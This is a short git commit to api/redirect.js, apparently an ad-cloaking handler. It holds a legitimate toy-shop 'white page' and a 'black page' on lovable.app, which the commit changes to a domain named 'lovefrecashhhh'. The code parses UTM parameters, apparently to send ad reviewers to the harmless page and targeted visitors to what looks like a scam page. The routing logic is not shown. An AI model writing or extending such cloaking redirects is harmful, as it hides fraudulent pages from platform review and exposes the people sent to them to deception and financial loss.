17ada446690b52c1638d620e0c9b9ad7fe885a3f
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-10-12 01:59:18 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://donebydeer.com/en-dk/collections/activity-toys-for-babies-and-toddlers/products/hide-seek-activity-toy-clucky-sand";
-    const blackPageURL = "https://wherlnquz.lovable.app/";
+    const blackPageURL = "https://lovefrecashhhh.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
